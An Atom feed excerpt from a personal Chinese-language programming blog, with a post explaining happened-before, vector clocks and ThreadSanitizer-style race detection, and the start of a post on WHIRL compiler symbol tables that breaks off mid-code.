<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-02-26T22:28:45+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yvan’s blog</title><subtitle>&quot;循此苦旅，以达星辰&quot;</subtitle><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><entry><title type="html">Concurrency Analysis相关概念</title><link href="http://localhost:4000/blog/Concurrency-Analysis" rel="alternate" type="text/html" title="Concurrency Analysis相关概念" /><published>2023-06-09T00:00:00+02:00</published><updated>2023-06-09T00:00:00+02:00</updated><id>http://localhost:4000/blog/Concurrency-Analysis</id><content type="html" xml:base="http://localhost:4000/blog/Concurrency-Analysis"><![CDATA[<h2 id="preface">Preface</h2>
<p>最近开始阅读Concurrency Analysis相关的paper，主要涉及race condition和deadlock这些领域，记录一下学习中遇到的基本概念。</p>

<h2 id="causality-in-distributed-system">Causality in Distributed System</h2>
<p>对于一个计算系统而言，我们可以把他执行的过程描述成一系列指令或者事件 (Events) 的执行，这个指令或者事件会影响整个系统的状态。例如，我们可以把理想化的CPU抽象成一个有限状态机，每次执行指令都会改变CPU的状态，当然实际的的CPU由于乱序、多发射等优化事实上不是状态机，但是作为一个黑盒来看是没问题的。对于整个分布式系统而言，某个节点中，某个事件的发生可能会影响其他节点的状态，进而影响整个系统，例如：某个节点 <strong><em>a</em></strong> 向节点 <strong><em>b</em></strong> 发送消息，<strong><em>b</em></strong> 收到消息后会将该消息同步给 <strong>c</strong> 节点，同步消息这个事件显然是发送消息导致的。那么从“时间”概念上讲，发送消息应该发生在同步消息之前。这两个事件之间存在因果关系（cause-and-effect relations）。</p>

<blockquote>
  <p>那么物理上的时间比如几点几分，几月几日能够描述不同节点之间事件的因果关系吗？</p>
</blockquote>

<p>对于分布式系统而言，两个节点可能物理距离很近，例如运行在同一个CPU上的两个线程；也有可能离得很远，甚至不在同一个大陆。两台机器都不在同一个时区，如果使用物理上的时间先不考虑硬件时钟的误差，仅仅是时区之间的转换就比较复杂，效率很低。而且物理上的时间用整数表示会存在冗余，人类公历已经度过了2000多年，表示成整数是一种冗余的信息，因为我们只关注事情的先后次序，不关心事情发生的具体时间，因此需要引入一种特殊的“时间”来记录计算系统中事件发生的时刻。</p>

<h2 id="happened-before-relation">Happened-before Relation</h2>

<p>1978年，图灵奖大佬 <a href="https://en.wikipedia.org/wiki/Leslie_Lamport">Leslie Lamport</a> 发表了一篇名为 <em>Time, Clocks and the Ordering of Events in a Distributed System</em> \(^1\) 的文章，第一次引入了逻辑时钟和happened-before的概念。Happened-before (计作\(\rightarrow\)) 描述了分布式系统中事件发生的因果联系。当且仅当:</p>

<ol>
  <li><strong><em>c</em></strong> 和 <strong><em>e</em></strong> 发生在同一节点并且 <strong><em>c</em></strong> 更早发生
或者</li>
  <li><strong><em>c</em></strong> 和 <strong><em>e</em></strong> 发生在不同节点，<strong><em>e</em></strong> 可以通过其他节点发送的消息知道 <strong><em>c</em></strong> 已经发生了</li>
</ol>

<p>那么事件 <strong><em>c</em></strong> 就可以导致事件 <strong><em>e</em></strong> 的发生，也就是 <strong><em>c happened-before e</em></strong>。</p>

<p>如果两个事件彼此不知道对方是否已经发生，那么可以说两个事件是并发的 (Concurrent)。</p>

<p>下图展示了上文中消息同步的例子的 happened-before 关系，该图描述了分布式系统中的三个节点 <strong><em>a b c</em></strong>，事件节点(a1, b1 …)之间的边描述了事件之间的因果关系。我们可以通过这个有向无环图（Directed Acyclic Graph）来描述事件之间的因果关系。</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/ccaa/cc_demo1.png" alt="demo1" /></p>

<p>想要知道事件 <strong><em>c</em></strong> 是不是 happened-before 事件 <strong><em>e</em></strong>，我们只需要检查节 <strong><em>c</em></strong> 和 <strong><em>e</em></strong> 之间是不是连通的。例如上图中 \(a1 \rightarrow b2\) 并且 \(b2 \rightarrow c2\)，因此事件 <strong><em>a1 happened-before c2</em></strong>。</p>

<blockquote>
  <p>Happened-before relation 具有传递性</p>
</blockquote>

<p>同理我们可以发现 <strong><em>a1</em></strong> 和 <strong>c1</strong> 是不连通的 (\(a1 \nrightarrow c1\) and \(c1 \nrightarrow a1\))，即 <strong><em>a1</em></strong> 和 <strong><em>c1</em></strong> 并行，计作 \(a1 \parallel c1\)。</p>

<p>因此我们可以得出结论，两个事件x，y之间可能存在三种关系：</p>

<ol>
  <li>如果 \(x \rightarrow y\)， 则事件 x 可能影响 y</li>
  <li>如果 \(y \rightarrow y\)， 则事件 y 可能影响 x</li>
  <li>如果x，y之间没有相互影响即 \(x \nrightarrow y\) and \(y \nrightarrow x\)，则x，y是并行发生的 \(x \parallel y\)</li>
</ol>

<p>从离散数学的角度来看，happened-before关系是一个偏序关系 (Partial Order Relations)，下面简单介绍一下偏序关系。</p>

<h2 id="partial-order">Partial Order</h2>
<p>偏序关系 (Partial Order Relations) 是离散数学中二元关系的一种，主要拥有自反性 (Reflexivity)、反对称性 (<a href="https://en.wikipedia.org/wiki/Antisymmetric_relation">Antisymmetry</a>)和传递性 (Transitivity)。</p>

<ol>
  <li>Reflexivity: \(a \leq a\) ，every element is related to itself</li>
  <li>Antiseymmetric: if \(a \leq b\) and \(b \leq a\)  then \(a = b\) ，no two distinct elements precede each other</li>
  <li>Transitivity: if \(a \leq b\) and \(b \leq c\) then \(a \leq c\)</li>
</ol>

<p>满足这三条性质的二元关系就是非严格的偏序关系，也可以被称作<a href="https://en.wikipedia.org/wiki/Preorder">非对称前序关系</a>，如果满足非自反性 (Irreflexivity) 和非对称性 (<a href="https://en.wikipedia.org/wiki/Asymmetric_relation">Asymmetric</a>)，则被称为严格偏序关系：</p>

<ol>
  <li>Irreflexivity: not \(a &lt; a\)</li>
  <li>Asymmetric: if \(a &lt; b\) then not \(b &lt; a\)</li>
  <li>Transitivity: if \(a &lt; b\) and \(b &lt; c\) then \(a &lt; c\)</li>
</ol>

<p>通过 Irreflexivity 和 Transitivity 的性质可以推出Asymmetric的性质。</p>

<h2 id="causal-histories">Causal Histories</h2>
<p>为了记录事件之间的因果关系，我们可以使用集合来记录事件因果的历史记录。以下图为例，我们给每个事件分配一个唯一的标识符，每个事件的集合取他前驱节点的并集，得到的集合就是该事件的 Causal History。例如事件 <strong><em>b2</em></strong> 的前驱节点有 <strong><em>a1</em></strong> 和 <strong><em>b1</em></strong>，因此 <strong><em>b2</em></strong> 的 Causal History 为 \(H_{b2} = \{a1, b1, b2\}\)。</p>

<p>当一个节点向另外一个节点发送消息时，会将自己的最新的 Casual History 附带在消息中，其他节点收到消息后，会将收到的 Casual History 集合合并到自己本地的 History 集合。例如 <strong><em>b</em></strong> 向 <strong><em>c</em></strong> 发送消息时，会将自己的 History \(H_{b2} = \{a1, b1, b2\}\) 附带在消息中，<strong><em>c</em></strong> 收到消息后，将自己的 History \(H_{c2} = \{c1, c2\}\) 和收到的 History \(H_{b2} = \{a1, b1, b2\}\) 合并，得到 \(H_{c2} = \{\textbf{a1}, \textbf{b1}, \textbf{b2}, c1, c2\}\)。
<img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/ccaa/cc_demo2.png" alt="demo2" /></p>

<p>我们可以通过检查事件之间的包涵关系来检查两个事件时候存在Happened-before 关系。当且仅当 \(H_x \subsetneq H_y\) 时，事件 x 可能影响事件 y，即 \(x \rightarrow y\)。这个概念很符合直觉，如果事件 x 影响了事件 y，那么事件 x 的历史记录一定是事件 y 的历史记录的子集。</p>

<p>但是这种集合的表示并不够紧凑，例如上图中的事件 <strong><em>c2</em></strong>，其历史记录为 \(H_{c2} = \{a1, b1, b2, c1, c2\}\)，但是我们可以发现 \(b1 \rightarrow b2\) 并且 \(c1 \rightarrow c2\)，因此 \(H_{c2}\) 中的 \(b1\) 和 \(c1\) 是多余的，考虑到Happened-before的传递性，我们只需要知道每个节点最近发生的事件就足够了，因此我们可以用更加紧凑的方式来表示事件的历史记录。 \(H_{c2} = \{ a\rightarrowtail1, b\rightarrowtail2, c\rightarrowtail2 \}\)</p>

<p>这也就是我们接下来要介绍的Vector Clock。</p>

<h2 id="vector-clock">Vector Clock</h2>
<p>Vector Clock 用于确定分布式系统中并发事件的偏序关系，最早可以追溯到1988年的<a href="http://www.vs.inf.ethz.ch/publ/papers/VirtTimeGlobStates.pdf">这篇</a>\(^2\)文献。</p>

<p>让我们继续回到上面的例子，\(\{ a\rightarrowtail1, b\rightarrowtail2, c\rightarrowtail2 \}\) 可以被化简为一个简单的向量 [1, 2, 2]，这种紧密的表示已经足以记录每个节点最近的事件。因此我们可以使用这种更加紧凑的向量结构 VectorClock 来取代 Casual History 这种集合的形式。</p>

<p>上文提到我们可以判断两个事件 x、y 的 Casual History 集合是否互为子集来判断是否 \(x \rightarrow y\)。当我们把数据结构换成 VectorClock 后，算法需要做出简单的调整，我们需要检查 \(VC_x\) 是否严格小于 (\(\prec\)) \(VC_y\)，即:</p>

\[\forall i: V_x[i] \leq V_y[i] \land \exists j: V_x[j] &lt; V_y[j]\]

<p>记做:</p>

\[x \rightarrow y \Longleftrightarrow V_x \prec V_y\]

<p>每当某节点 <strong><em>a</em></strong> 发生一个新的事件，我们不再创建一个新的名字，而是将该节点对应的 VectorClock 中的元素加一，例如 <strong><em>a</em></strong> 发生了新的事件，那么 \(V_a = [1, 0, 0]\) 变成 \(V_a = [2, 0, 0]\)。</p>

<p>最后，Casual History 集合的 Union 操作我们变成取两个向量中对应元素的最大值，只管来讲，我们只需要保留每个节点的最新事件作为时钟，即：</p>

\[V_x \cup V_y \Longleftrightarrow \forall i: V[i] = max(V_x[i], V_y[i])\]

<p>这里仍然以上文中的例子为例，如图所示：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/ccaa/cc_demo3.png" alt="demo3" /></p>

<p>此时我们可以发现，当节点 <strong><em>c</em></strong> 获得来自 <strong><em>b</em></strong> 的消息同步时，其当前的 VectorClock 为[1, 2, 2]，远远比 Casual History 这种集合的表示信息密度更大，可以有效节省存储空间，并且 VectorClock 的 Compare 和 Union 操作都是线性的时间复杂度，效率更高。</p>

<h2 id="race-condition-detection">Race Condition Detection</h2>

<p>了解了 VectorClock 和 Happened-before 的概念，我们可以继续介绍如何使用VectorClock 来检测 Race Condition。Race Condition 在计算机系统中非常之常见，从电路的数据冒险 (Data Hazard)，到上层 web 应用的高并发导致的数据竞争，已经数据库、操作系统中常见的脏读脏写等等，广义上都属于 Race Condition。高并发可以极大的提高计算机系统的吞吐量，同时并发也会导致复杂度的增加，程序员就更容易出错，Race Condition 或许就是性能提升带来的代价吧😂。</p>

<p>现在的大公司的服务端程序基本都是极高的并发量，使用 C++ 或者 Golang 开发，Race Condition 的问题就更加严重，并且 Race Condition 在大型系统中<strong>非常非常难以复现</strong>，因此在开发或者测试的过程中，大公司都会通过各种手段来检测 Race Condition，例如静态分析、动态分析、模糊测试等等。</p>

<p>有一个比较常见的 Race Condition 检查器是 Google 开发的 <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual">ThreadSanitizer</a>(简称TSan)，现在被集成到了 <a href="https://llvm.org">LLVM</a> 的 compiler-rt 中，作为LLVM的运行时库的一部分，之后我们或许会做更加详细的介绍（挖坑🌚。</p>

<p>我们这里把 Race Condition 的范围缩小一点，只关注多线程之间的竞争，当不同线程读和写(Read-Write/Write-Read)、写和写(Write-Write)并行执行时存在 Race Condition，例如下面这段代码：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;thread&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="n">x</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">thread1</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// race condition</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="kr">thread</span> <span class="n">t1</span><span class="p">(</span><span class="n">thread1</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="kr">thread</span> <span class="n">t2</span><span class="p">(</span><span class="n">thread1</span><span class="p">);</span>
    <span class="n">t1</span><span class="p">.</span><span class="n">join</span><span class="p">();</span>
    <span class="n">t2</span><span class="p">.</span><span class="n">join</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这段代码中，两个线程同时访问了共享变量x，这就是一个典型的 Write-Write Race Condition。如何检查这个bug呢？</p>

<p>首先我们先思考一下正确的代码应该是什么样的，最简单的方式，我们应该在访问共享变量 x 的时候加锁，例如：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;thread&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;mutex&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
<span class="n">std</span><span class="o">::</span><span class="n">mutex</span> <span class="n">mtx</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">thread1</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// acquire lock</span>
    <span class="n">std</span><span class="o">::</span><span class="n">lock_guard</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">mutex</span><span class="o">&gt;</span> <span class="n">guard</span><span class="p">(</span><span class="n">mtx</span><span class="p">);</span>
    
    <span class="c1">// critical section</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

    <span class="c1">// lock released automatically</span>
<span class="p">}</span>
</code></pre></div></div>

<p>上述代码是 C++ 使用锁的方式，或者我们也可以将变量 x 声明为 <code class="language-plaintext highlighter-rouge">std::atomic&lt;int&gt; x</code>，这样就可以使用原子操作来保证线程安全。假如使用锁来保护数据的读写，我们可以发现锁就是不同线程之间的同步消息，对于线程 <em>t</em> 而言，锁的获得(Acquire)就是相当于从其他线程收到同步消息，锁的释放(Release)就相当于向其他线程发送同步消息。因此，考虑到上文提到的 VectorClock，我们可以使用 VectorClock 来记录每个线程的同步消息，方法大概如下：</p>

<ol>
  <li>每个线程自己维护一个 VectorClock，用于记录自己的事件和收到的同步消息</li>
  <li>每个锁维护一个 VectorClock，用于记录锁的同步消息</li>
  <li>线程 <em>t</em> 获得锁的时候执行： \(V_{t} = V_{t} \cup V_{lock}\)</li>
  <li>线程 <em>t</em> 释放锁的时候执行： \(V_{t}[t] += 1; V_{lock} = V_{t}\)</li>
</ol>

<p>这样以来，每个线程之间的同步在运行时就可以被记录下来，很显然锁的释放和获得构成了 Happened-before 关系。同时程序的执行往往存在以下约束：</p>

<ol>
  <li>不可以在其他线程释放锁之前再次获得锁</li>
  <li>单个线程中的指令是顺序执行的（把CPU和编译器的优化作为黑盒）</li>
</ol>

<p>因此，不同的 Acq 和 Rel 操作之间的读写操作也存在 Happened-before 关系，如下图所示：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/ccaa/cc_demo4.png" alt="demo4" /></p>

<p>我们可以看到 <strong><em>a</em></strong>、<strong><em>b</em></strong> 两个线程分别读写共享变量 <strong><em>x</em></strong>，并通过锁 <strong><em>L</em></strong> 进行消息的同步，我们可以得到以下关系：</p>

\[Acq_b(L) \rightarrow Write(x)\]

\[Write(x) \rightarrow Rel_b(L)\]

\[Rel_b(L) \rightarrow Acq_a(L)\]

\[Acq_a(L) \rightarrow Read(x)\]

<p>由于Happened-before 关系具有传递性，我们可以得到：</p>

\[Write(x) -&gt; Read(x)\]

<p>因此 <strong><em>b</em></strong> 线程的写操作和 <strong><em>a</em></strong> 线程的读操作不是并行的，因此不存在 Race Condition。为了记录所有线程对变量 <strong><em>x</em></strong> 的读写操作的时钟，我们可以在全局分别维护两个 VectorClock \(V_R\) 和 \(V_W\)，分别用于记录读操作和写操作的时钟：</p>

<ol>
  <li>当线程 <em>t</em> 执行读操作后，执行 \(V_R = V_R \cup V_t\)</li>
  <li>当线程 <em>t</em> 执行写操作后，执行 \(V_W = V_W \cup V_t\)</li>
</ol>

<p>那么我们如何在运行时检查是否存在 Race Condition呢？我们设计如下算法：</p>

<ol>
  <li>当线程 <em>t</em> 在对变量 <strong><em>x</em></strong> 将要执行写操作时，首先检查 \(V_{Rx} \prec V_t; V_{Wx} \prec V_t\) 即其他线程对 <strong><em>x</em></strong> 读写操作是否 Happened-before 当前线程的写操作，如果不是，则说明存在对变量 <strong><em>x</em></strong> 并行的读写行为，属于 Race Condition。</li>
  <li>当线程 <em>t</em> 在对变量 <strong><em>x</em></strong> 将要执行读操作时，首先检查 \(V_{Rw} \prec V_t\)，由于并行的读操作没有副作用，因此我们在读取变量 <strong><em>x</em></strong> 之前，只需要检查是否存在并行的写(Read-Write)操作即可。</li>
</ol>

<p>码实现如下，这里需要重载 <code class="language-plaintext highlighter-rouge">&lt;</code> 和 <code class="language-plaintext highlighter-rouge">&amp;</code> 来进行 VectorClock 的比较和合并：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">check_write</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">V_Rx</span> <span class="o">&lt;</span> <span class="n">V_t</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">V_Wx</span> <span class="o">&lt;</span> <span class="n">Vt</span><span class="p">))</span>
        <span class="n">V_Wx</span> <span class="o">&amp;=</span> <span class="n">V_t</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">throw</span> <span class="n">RaceConditionError</span><span class="p">;</span>

<span class="n">check_read</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">V_Rx</span> <span class="o">&lt;</span> <span class="n">V_t</span><span class="p">)</span>
        <span class="n">V_Rx</span> <span class="o">&amp;=</span> <span class="n">V_t</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">throw</span> <span class="n">RaceConditionError</span><span class="p">;</span>
</code></pre></div></div>

<p>当然这里还可以继续优化 \(V_R\) 和 \(V_W\) 的数据结构，2009年的一篇PLDI的<a href="https://users.soe.ucsc.edu/~cormac/papers/pldi09.pdf">paper</a> \(^3\) 将 \(V_R\) 和 \(V_W\) 的数据结构优化为了一个叫做 <em>Epoch</em> 的数据结构，把空间复杂度从 \(O(n)\) 降到了 \(O(1)\)。感兴趣的同学可以自行阅读，这里就不再赘述了。</p>

<h2 id="back-to-tsan">Back to TSan</h2>

<p>简单介绍一下TSan，你可以非常方便的使用TSan来检查自己的C++程序是否存在 Race Condition、Dead Lock等情况，他可以在运行时检查存在的线程相关的问题，具体的使用方式如下：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// clang -fsanitize=thread -g -O2 test.cpp</span>
<span class="cp">#include</span> <span class="cpf">&lt;thread&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="n">x</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">thread1</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// race condition</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="kr">thread</span> <span class="n">t1</span><span class="p">(</span><span class="n">thread1</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="kr">thread</span> <span class="n">t2</span><span class="p">(</span><span class="n">thread1</span><span class="p">);</span>
    <span class="n">t1</span><span class="p">.</span><span class="n">join</span><span class="p">();</span>
    <span class="n">t2</span><span class="p">.</span><span class="n">join</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>用上述命令编译并执行该程序，可以看到如下输出：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/ccaa/tsan_rpt1.png" alt="tsan report" /></p>

<p>TSan会在编译时对关键函数进行插桩，并在这些关键函数执行的前后更新相关的VectorClock并进行检查，例如:</p>

<ul>
  <li>pthread_create</li>
  <li>pthread_join</li>
  <li>pthread_mutex_lock</li>
  <li>pthread_mutex_unlock</li>
  <li>…</li>
</ul>

<p>以 <code class="language-plaintext highlighter-rouge">pthread_mutex_unlock</code> 为例：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TSAN_INTERCEPTOR</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="n">pthread_mutex_unlock</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">m</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">SCOPED_TSAN_INTERCEPTOR</span><span class="p">(</span><span class="n">pthread_mutex_unlock</span><span class="p">,</span> <span class="n">m</span><span class="p">);</span>
  <span class="n">MutexUnlock</span><span class="p">(</span><span class="n">thr</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="p">(</span><span class="n">uptr</span><span class="p">)</span><span class="n">m</span><span class="p">);</span>
  <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">REAL</span><span class="p">(</span><span class="n">pthread_mutex_unlock</span><span class="p">)(</span><span class="n">m</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="n">errno_EINVAL</span><span class="p">)</span>
    <span class="n">MutexInvalidAccess</span><span class="p">(</span><span class="n">thr</span><span class="p">,</span> <span class="n">pc</span><span class="p">,</span> <span class="p">(</span><span class="n">uptr</span><span class="p">)</span><span class="n">m</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>TSan首先会调用 MutexUnlock 函数来更新对应锁的 VectorClock，然后继续执行被 hook 的 <code class="language-plaintext highlighter-rouge">pthread_mutex_unlock</code> 函数。</p>

<p>这种检查方式属于静态分析和动态分析的结合，工业界似乎称之为IAST（花里胡哨😂，理论上来说IAST是可以做到没有漏报和误报的，但是由于TSan在实现的过程中考虑到性能问题，把不同的线程非配到了固定数量的 <em>vCPU</em> 上，导致不同线程之间可能抢占同一个 VectorClock，因此会存在小概率漏报(TSan的team自己声称小概率…)，但是仍然不存在误报。</p>

<h2 id="summary">Summary</h2>

<p>以上为近期阅读 Concurrency Analysis 相关 paper 的一些总结，发现并发是一个大坑，更多琐碎的细节例如：</p>

<ol>
  <li>不同硬件的 Memory Model（Arm 的 weak model 和 Intel TSO） 的区别</li>
  <li>不同编程语言的 Memory Model</li>
  <li>编译器的优化例如指令调度</li>
  <li>CPU的优化（cache的同步、多核的同步、乱序执行、多发射等等）</li>
  <li>…</li>
</ol>

<p>以上因素对并发程序的正确性和运行效率都存在深远的影响，同时也存在着很多挑战和机会等着我们去探索。</p>

<h2 id="reference">Reference</h2>

<ol>
  <li><a href="https://www.microsoft.com/en-us/research/publication/time-clocks-ordering-events-distributed-system/?from=https://research.microsoft.com/en-us/um/people/lamport/pubs/time-clocks.pdf&amp;type=exact">Time, Clocks and the Ordering of Events in a Distributed System</a>, by Leslie Lamport</li>
  <li><a href="http://www.vs.inf.ethz.ch/publ/papers/VirtTimeGlobStates.pdf">Virtual Time and Global States of Distributed Systems</a>, by Friedemann Mattern</li>
  <li><a href="https://users.soe.ucsc.edu/~cormac/papers/pldi09.pdf">FastTrack: Efficient and Precise Dynamic Race Detection</a>, by Cormac Flanagan, Stephen N. Freund</li>
  <li><a href="https://queue.acm.org/detail.cfm?id=2917756">Why Logical Clocks are Easy</a>, by Carlos Baquero, Nuno Preguiça</li>
</ol>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="program analysis，concurrency" /><summary type="html"><![CDATA[并行程序分析]]></summary></entry><entry><title type="html">WHIRL相关笔记(2)</title><link href="http://localhost:4000/blog/whirl2" rel="alternate" type="text/html" title="WHIRL相关笔记(2)" /><published>2022-11-22T00:00:00+01:00</published><updated>2022-11-22T00:00:00+01:00</updated><id>http://localhost:4000/blog/whirl2</id><content type="html" xml:base="http://localhost:4000/blog/whirl2"><![CDATA[<h2 id="序">序</h2>

<p>上次我们大致介绍了Open64的WHIRL指令的基本设计和结构，文本讲简单介绍一下WHIRL的符号表设计。符号表 (Symbol Table) 是编译器中的一个重要模块，记录了源代码的一些重要信息。课本中介绍的符号表是比较狭义的、货真价实的“符号”表。这种狭义的表结构用于存放源代码中的各种符号，例如变量，函数的一些重要信息，比如类型信息，初始化值等等。并且该结构需要能够区分不同作用域中的同名符号，例如：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">f</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">)</span> <span class="p">{</span>     <span class="c1">// parameter a in the scope s0</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>    <span class="c1">// variable a in the scope s1</span>
    <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>     <span class="c1">// variable b in the scope s1</span>
    <span class="k">return</span> <span class="n">b</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="kt">int16_t</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="c1">// variable b in the scope s2</span>
    <span class="k">return</span> <span class="n">b</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>两个名为“b”的变量出现在了不同的作用域，应当在符号表中予以区分。然而真实的工业编译器的符号表通常保存了更多详细的程序信息，用于后续的IR生成、检查以及优化。</p>

<h2 id="trivial-symbol-table">Trivial Symbol Table</h2>

<p>在介绍WHIRL这个庞然大物的复杂符号表之前，我们先来介绍一下一种非常简单的符号表的设计，通常用于玩具编译器的实现。以C语言为例，不考虑struct/union这种复杂语法，下意识里我们很快的能想象出一种合适的数据结构来实现符号表，那就是哈希表。可以使用符号名作为哈希表的键，用SymInfo这个struct作为哈希表的值，来保存符号的类型等信息。以序中的函数f为例，scope s1的符号表可以长下面这样：</p>

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>SymInfo::Type</th>
      <th>SymInfo::Init</th>
      <th>SymInfo::IsConst</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>a</td>
      <td>CHAR</td>
      <td>1</td>
      <td>false</td>
    </tr>
    <tr>
      <td>b</td>
      <td>INT</td>
      <td>2</td>
      <td>false</td>
    </tr>
  </tbody>
</table>

<p>我们可以把程序的<em>scope</em>当作一个树进行处理，因为这里我们需要解决三个问题：</p>
<ol>
  <li>对于C语言而言<em>sub scope</em>中的符号可以遮盖<em>super scope</em>中的符号，例如上述代码中<em>scope s1</em>中的<em>char a</em>变量会覆盖，<em>scope s0</em> 中的 <em>int a</em> 参数。</li>
  <li><em>super scope</em>无法访问<em>sub scope</em>中定义的符号，<em>sub scope</em>却可以自由访问<em>super scope</em>。</li>
  <li>同级<em>scope</em>中的符号是互相屏蔽的，例如在<em>scope s2</em>中看不到<em>scope s1</em>中定义的a，b两个符号。
因此，我们需要设计一种可以满足上述要求的简单数据结构。对于一个玩具编译器而言，做完语意分析，确保没什么类型错误，并且后面发射IR用不到的话，就可以把符号表丢掉了。这里可以使用嵌套哈希表(Nested Hash Map)进行实现，如下图：</li>
</ol>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/whirl2/1_trivial_st.png" alt="nested hash map" /></p>

<p>如图所示，S0、S1、S2均维护一个哈希表结构，同时维护一个<em>Super Scope</em>的指针信息，当然S0的<em>Super Scope</em>是NULL。用代码实现大概如下：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">SymTreeNode</span> <span class="p">{</span>
  <span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">string</span><span class="p">,</span> <span class="n">SymInfo</span> <span class="o">*&gt;</span> <span class="n">symbols</span><span class="p">;</span>
  <span class="n">SymTreeNode</span> <span class="o">*</span><span class="n">super</span><span class="p">;</span>
<span class="nl">public:</span>
  <span class="n">SymInfo</span> <span class="o">*</span><span class="n">GetSymInfo</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">recursive</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">symbols</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">!=</span> <span class="n">symbols</span><span class="p">.</span><span class="n">end</span><span class="p">())</span> <span class="k">return</span> <span class="n">symbols</span><span class="p">[</span><span class="n">name</span><span class="p">];</span>    
    <span class="k">if</span> <span class="p">(</span><span class="n">recursive</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">super</span><span class="o">-&gt;</span><span class="n">GetSymInfo</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">nullptr</span><span class="p">;</span>
  <span class="p">}</span>

